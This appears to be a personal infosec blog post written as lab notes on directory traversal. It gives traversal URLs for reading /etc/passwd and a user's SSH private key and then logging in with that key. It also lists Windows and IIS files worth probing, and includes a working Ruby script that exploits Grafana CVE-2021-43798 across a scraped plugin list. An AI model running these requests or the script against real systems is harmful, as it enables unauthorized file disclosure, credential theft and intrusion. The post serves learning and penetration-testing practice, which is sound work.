---
layout: post
title: Directory Traversal Exploit
titledate: 08/27/23
tags: ["infosec","offsec", "web", "wordpress","exploit","shell","dir_traversal"]
---

<h4>Linux</h4>

When browsing a site we can hover over links to get an idea of the directory structure of the web application on the server.

Of course using tools like gobuster or feroxbuster can help us enumerate this dir structure easily, but it may be possible to perform directory traversal attack by traversing directories to try to access content outside of the web server

    $ http://vulnwebapp.com/home/index.php?page=../../../../../../../../../etc/passwd

You only need to give the minimum number of ../ to get to the root directory from the current working directory of the web page you are on, however, since there is no maximum we can just provide a large number of ../ to get to the root path

From the above command we can obtain a list of users on the system. With this information we learn about a user DON. We can try to find DON's ssh key with a typical directory layout 

    $ http://vulnwebapp.com/home/index.php?page=../../../../../../../../../home/DON/.ssh/id_rsa

If this request returns the private ssh key for don , we should use a different procedure to obtain the key as displaying content in the web browser can often get skewed as many characters may not be properly encoded. We can use wget, curl, or python/ruby to retrieve this information

    $ curl http://vulnwebapp.com/home/index.php?page=../../../../../../../../../home/DON/.ssh/id_rsa

Once we obtain the key we need to change the permissions on it because they are too open

    $ chmod 400 don_key

Now we can attempt to ssh to the machine hosting the vulnerable web server

    $ ssh -i don_key -p 2222 don@vulnwebapp.com

<h4>Windows</h4>

Windows is a little more difficult to obtain useable information than linux

    $ C:\Windows\System32\drivers\etc\hosts

This file should be accessible by all users and useful to try dir traversal attacks

<h3>We can not reach useful ssh data like we do for Linux, but information disclosure can still be relevant depending on what directory contents we can disclose</h3>

    $ C:\inetpub\logs\LogFiles\W3SVC1
    $ C:\inetpub\wwwroot\web.config

The files above both contain information about the IIS server, so it is always worth probing the directories to see what we can find

<h4>Grafana Use Case</h4>

This exercise requires us to ty to use a dir traversal against Grafana. We are given the CVE (vulnerability), so we have to assume we would not know this information. To begin we would need to identify the Web App Grafana and version, or at the least the Software name (Grafana) and if it doesn' have a lot of publicaly disclosed vulnerabilities then we can fire from the hip and see what sticks

In this case as expressed we are given the CVE 2021-43798 , reading the NVD description we can already glean tons of info - the vuln is a dir path traversal in the /public/plugins//{plugin} directory. So while there are publicaly available exploits for this - we don't need them

First we need to identify what plugin is installed 
I began by running gobuster and feroxbuster against the plugins directory but they did not find anything... so we need to create a custom wordlist of plugins available to Grafana

    $ curl https://grafana.com/grafana/plugins/all-plugins/ -o plugins

This downloads plugins listed on their site from their all-plugins page in an html file

```ruby
data = File.open("/home/kali/plugins","r"){|f| f.read }
plugins = data.split('href=/grafana/plugins/')
# i started at 8 bc i could visibly see that's where the list starts
# with a bunch of garbage we don't care about above
plugins[8..-1].each do |plugin|
  name = plugin.split('/><div>')
  File.open("/home/kali/plugin_name","a"){|f|f.write("#{name[0]}\n")}
end
```

This gives us a line delimted list of 369 plugins to brute force with gobuster or feroxbuster
...

Unfortunately - After failing to get any useable response codes from requesting the above base uri + /public/plugins/{plugin} I have determined that you would need to try the traversal 1 at a time per plugin... this really goes sums up my earlier point that you need to know the version of the application and then look for the canned exploit. 

I could write a script to iterate through the plugins 1 at time that i already created, but it turns out searchsploit has an attack for this already

Looking at the python searchsploit script i can see that it chooses 1 plugin randomly? and does not seem to work well for this use case, so i wrote a small ruby script to use the line delimitted plugins file i scraped

```ruby
#!/usr/bin/env ruby
def pwn
  plugin_file = File.open("/home/kali/plugin_name","r") do |f|
    f.each_line { |line|
      line = line.chomp
      puts "trying #{line}"
      # public/plugins is the vulnerable root of the plugin we can understand from the NVD CVE disclosure -
      # sucks we can't get a useable response from directory fuzzing
      cmd = "curl --path-as-is http://#{ARGV[0]}/public/plugins/#{line}/../../../../../../../../../../../#{ARGV[1]}"
      puts "trying #{cmd}"
      system(cmd)
    }
  f.close
  end
end

if ARGV[0] == '-h' || ARGV[0] == '--help' || ARGV[0] == nil
  puts "[+] plugin_pwn.rb ip file"
  puts "[+] where ip is ipaddress"
  puts "[+] and file is file to read"
  exit
else
  puts "[+] probing.. #{ARGV[0]}"
  pwn
end
```

So to execute it 

    $ ruby plugin_pwn.rb 192.168.255.190:3000 Users/install.txt

Most likely this script won't be useable in the future.. from this exercise I learned that it won't be easy to identify file/directory structures always and that if there isn't enough available information on the vulnerability it will take TOO MUCH time .. so look for what's available and it will make modifying the attack easier
